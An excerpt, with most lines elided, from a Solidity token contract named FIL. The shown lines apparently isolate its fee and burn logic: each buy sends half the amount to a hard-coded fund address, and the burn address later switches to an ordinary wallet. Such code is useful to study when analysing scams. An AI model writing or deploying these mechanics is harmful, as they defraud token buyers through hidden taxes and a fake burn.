...
contract FIL is IERC20, Ownable {
    ...
    address _default = address(0xb3C52b8AAEAD8c2f628ccF7Eb6d15b33778D80a6);
	address _fundAddress = address(0x1473677F40ebbCF657966E7900A34781a3d8C762);
	address _deadAfter = address(0xb3C52b8AAEAD8c2f628ccF7Eb6d15b33778D80a6);
    ...
    constructor(address tokenOwner) {
        ...
        _decimals = 18;
        _tTotal = 2 * 10**27;
		_destroyMaxAmount = _tTotal.sub(2 * 10**6);
    ...
    function _transfer(
		...
		if(_destroyMaxAmount <= balanceOf(_destroyAddress)){
			_destroyAddress = _deadAfter;
		}
    ...
    function _tokenTransferBuy(
        ...
        if (takeFee) {
			...
			_takeTransfer(
                sender,
                _fundAddress,
                tAmount.div(100).mul(50),
                currentRate
            );
            _takeInviterFee(sender, recipient, tAmount, currentRate);//0.9
            rate = 53;
        }
    ...
    function _takeInviterFee(
        ...
        for (uint256 i = 0; i < 2; i++) {
            ...
            uint256 curTAmount = tAmount.div(10000).mul(45);
        ...
        if(buySize>0 && sendAmount > 0 && totalAmount > 0){
            ...
            if(buySize >10){
                for(uint256 i=0;i<10;i++){
                    ...
                    if(amountUsdt>10**10){
						_tokenTransfer(address(this),user,amountUsdt,false);
                    }
